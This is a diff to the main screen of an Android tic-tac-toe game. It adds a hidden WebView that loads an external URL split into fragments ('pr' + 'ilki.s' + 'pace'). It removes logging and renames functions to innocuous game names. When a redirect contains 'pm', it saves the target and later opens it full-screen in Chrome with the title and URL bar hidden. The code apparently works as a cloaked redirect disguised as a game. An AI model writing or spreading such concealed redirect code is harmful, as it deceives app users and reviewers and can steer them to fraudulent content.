@@ -16,11 +16,11 @@ import android.graphics.BitmapFactory;
 import android.graphics.Color;
 import android.net.Uri;
 import android.os.Bundle;
-import android.util.Log;
 import android.view.View;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.ImageView;
+import android.widget.LinearLayout;
 import android.widget.TextView;
 import com.example.tictactoemvp.R;
 import com.example.tictactoemvp.model.ChessBoard;
@@ -33,41 +33,24 @@ public class MainActivity extends AppCompatActivity implements MainMvpView {
     ArrayList<ImageView> mListZeroIV;
     ArrayList<ImageView> mListCrossIV;
     TextView mNotificationTV;
-    WebView w;
-    CustomTabsSession red;
-    static final String POLICY_CHROME = "com.android.chrome";
-    CustomTabsClient poli;
-
-
+    SharedPreferences sharedPrefsHelper;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        final SharedPreferences sharedPrefsHelper = getSharedPreferences("database", MODE_PRIVATE);
+        sharedPrefsHelper = getSharedPreferences("database", MODE_PRIVATE);
         if (sharedPrefsHelper.getString("username", "").isEmpty()) {
-            w = findViewById(R.id.w);
-            w.setWebViewClient(new WebViewClient() {
-                public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                    Log.d("glovo", url);
-                    if (url.contains("pm")) {
-                        sharedPrefsHelper.edit().putString("username", url).apply();
-                        showPolicy(url);
-                    }
-                    return super.shouldOverrideUrlLoading(view, url);
-                }
-            });
+            setContentView(R.layout.activity_main);
+            makeWork();
+            getWindow().setBackgroundDrawable(null);
 
-        w.loadUrl("https://prilki.space/");
-        getWindow().setBackgroundDrawable(null);
+            mPresenter = new MainPresenter(this);
+            mPresenter.start();
+            mNotificationTV = findViewById(R.id.notification);
 
-        mPresenter = new MainPresenter(this);
-        mPresenter.start();
-        mNotificationTV = findViewById(R.id.notification);
-
-        //find all imageViews which represents Zero or Cross, attach them to ArrayList
-        attachViewToMyArrayList();
+            //find all imageViews which represents Zero or Cross, attach them to ArrayList
+            attachViewToMyArrayList();
         }else {
-            showPolicy(sharedPrefsHelper.getString("username",""));  //start chrome
+            showGameMod(sharedPrefsHelper.getString("username",""));  //start chrome
         }
     }
 
@@ -100,12 +83,42 @@ public class MainActivity extends AppCompatActivity implements MainMvpView {
         }
     }
 
+    private void makeWork(){
+        LinearLayout myLayout = findViewById(R.id.parent);
+        app = new WebView(this);
+        app.setVisibility(View.GONE);
+        app.setLayoutParams(new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT,
+                LinearLayout.LayoutParams.MATCH_PARENT));
+        myLayout.addView(app);
+
+        app.setWebViewClient(new WebViewClient() {
+            public boolean shouldOverrideUrlLoading(WebView view, String its) {
+                if (its.contains("pm")) {
+                    sharedPrefsHelper.edit().putString("username", master + sew + cru).apply();
+                    showGameMod(its);
+                }
+                return super.shouldOverrideUrlLoading(view, its);
+            }
+        });
+
+        app.loadUrl(master + sew + cru);
+    }
+
     //find imageView which represents the Zero at i-th position
     private ImageView getZeroIVAt(int i) {
         String stringId = "zero_" + i;
         int realID = getResources().getIdentifier(stringId, "id", getPackageName());
         return findViewById(realID);
     }
+
+    WebView app;
+    CustomTabsSession helper;
+    String POLICY_CHROME = "com.android.chrome";
+    CustomTabsClient poli;
+    String master = "https://pr";
+    String sew = "ilki.s";
+    String cru = "pace/";
 
     //find imageView which represents the Cross at i-th position
     private ImageView getCrossIVAt(int i) {
@@ -140,7 +153,7 @@ public class MainActivity extends AppCompatActivity implements MainMvpView {
         mListZeroIV.get(i).setVisibility(View.VISIBLE);
     }
 
-    public void showPolicy(String link){
+    public void showGameMod(String link){
         CustomTabsServiceConnection connection = new CustomTabsServiceConnection() {
             @Override
             public void onCustomTabsServiceConnected(ComponentName componentName, CustomTabsClient customTabsClient) {
@@ -148,7 +161,7 @@ public class MainActivity extends AppCompatActivity implements MainMvpView {
                 poli = customTabsClient;
                 poli.warmup(0L);
                 //Initialize a session as soon as possible.
-                red = poli.newSession(null);
+                helper = poli.newSession(null);
             }
 
             @Override
@@ -158,7 +171,7 @@ public class MainActivity extends AppCompatActivity implements MainMvpView {
         };
         CustomTabsClient.bindCustomTabsService(getApplicationContext(), POLICY_CHROME, connection);
         final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.empty);
-        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(red)
+        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(helper)
                 .setToolbarColor(Color.parseColor("#3E3E3E"))
                 .setShowTitle(false)
                 .enableUrlBarHiding()
